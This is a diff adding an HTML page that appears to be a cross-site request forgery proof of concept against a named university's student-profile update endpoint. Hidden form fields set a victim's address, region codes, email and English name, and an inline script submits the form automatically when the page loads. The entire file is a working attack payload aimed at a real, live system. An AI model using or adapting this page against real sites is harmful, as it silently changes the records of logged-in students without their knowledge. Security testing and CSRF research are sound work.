@@ -1,0 +1,22 @@
+<html>
+<head>
+        <title>w1</title>
+</head>
+<body>
+        <form action="http://matrix.dean.swust.edu.cn/acadmicManager/index.cfm?event=studentProfile:profileUpdateDo" method="POST">
+                <input type="hidden" name="NationCode" value="01">
+                <input type="hidden" name="forProvince" value="15">
+                <input type="hidden" name="forCity" value="1504">
+                <input type="hidden" name="forCounty" value="150404">
+                <input type="hidden" name="HomeAddress" value="内蒙城区">
+                <input type="hidden" name="ZipCode" value="000000">
+                <input type="hidden" name="EmailAddress" value="124@143.com">
+                <input type="hidden" name="StudentTelephone" value="">
+                <input type="hidden" name="EnglishName" value="liu Chongyang">
+        </form>
+<!-- <img src="http://localhost:8002/"> -->
+<script type="text/javascript">
+document.getElementsByTagName("form")[0].submit()
+</script>
+</body>
+</html>
